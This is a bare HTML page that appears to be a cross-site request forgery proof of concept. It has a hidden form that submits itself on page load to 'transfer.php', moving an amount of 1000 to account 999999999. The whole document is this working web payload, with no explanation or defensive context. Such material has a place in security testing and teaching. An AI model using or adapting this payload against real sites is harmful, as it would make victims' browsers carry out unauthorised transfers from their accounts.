<html>
	<body onload="document.getElementById('xsrf').submit();">
		<form id="xsrf" method="GET" action="transfer.php">
			<input name="amount" type="hidden" value="1000">
			<input name="AcNo" type="hidden" value="999999999">
			<input name="action" type="hidden" value="Change">
			</form>
	</body>
</html>

